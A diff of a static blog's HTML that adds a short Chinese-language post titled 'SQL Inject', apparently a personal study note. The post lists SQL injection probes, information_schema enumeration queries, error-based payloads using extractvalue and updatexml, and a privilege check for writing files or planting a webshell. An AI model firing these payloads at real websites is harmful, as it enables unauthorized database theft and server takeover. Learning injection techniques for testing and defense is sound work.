@@ -195,6 +195,16 @@
           </a>
         </li>
       
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
 
       
     </ul>
@@ -214,6 +224,171 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/sqlInjec_note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/16/sqlInjec_note/" itemprop="url">SQL Inject</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T20:17:18+08:00">
+                2020-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="有关SQL注入"><a href="#有关SQL注入" class="headerlink" title="有关SQL注入"></a>有关SQL注入</h1><h2 id="查看开发者使用哪种查询"><a href="#查看开发者使用哪种查询" class="headerlink" title="查看开发者使用哪种查询"></a>查看开发者使用哪种查询</h2><ol>
+<li>?id=1’–+</li>
+<li>?id=1–+</li>
+<li>?id=1’)–+</li>
+<li>?id=1”)–+</li>
+<li>?id=1”))-++</li>
+</ol>
+<h2 id="爆库-表-字段"><a href="#爆库-表-字段" class="headerlink" title="爆库,表,字段"></a>爆库,表,字段</h2><h3 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
+<h3 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=’xxxxx’</span><br></pre></td></tr></table></figure>
+<h3 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=’xxxxx’</span><br></pre></td></tr></table></figure>
+<h3 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> *** <span class="keyword">from</span> ****</span><br></pre></td></tr></table></figure>
+<h2 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h2><h4 id="基于xpath语法错误"><a href="#基于xpath语法错误" class="headerlink" title="基于xpath语法错误"></a>基于xpath语法错误</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">?nid=<span class="number">12</span><span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ </span></span><br><span class="line"><span class="string">//这里的concat的第二个参数就是查询语句</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="导入导出（传马）"><a href="#导入导出（传马）" class="headerlink" title="导入导出（传马）"></a>导入导出（传马）</h3><ol>
+<li><p>查看是否有读写权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">--+ </span></span><br><span class="line">如果结果返回正常,说明具有读写权限，否则无</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>欲读取文件必须在服务器上，加个木马啥的</p>
+</li>
+<li><p>必须指定文件完整的路径</p>
+</li>
+<li><p>欲读取文件必须小于 max_allowed_packet</p>
+</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -437,7 +612,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -448,7 +623,7 @@
               
               <div class="site-state-item site-state-categories">
                 
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">categories</span>
                 
               </div>
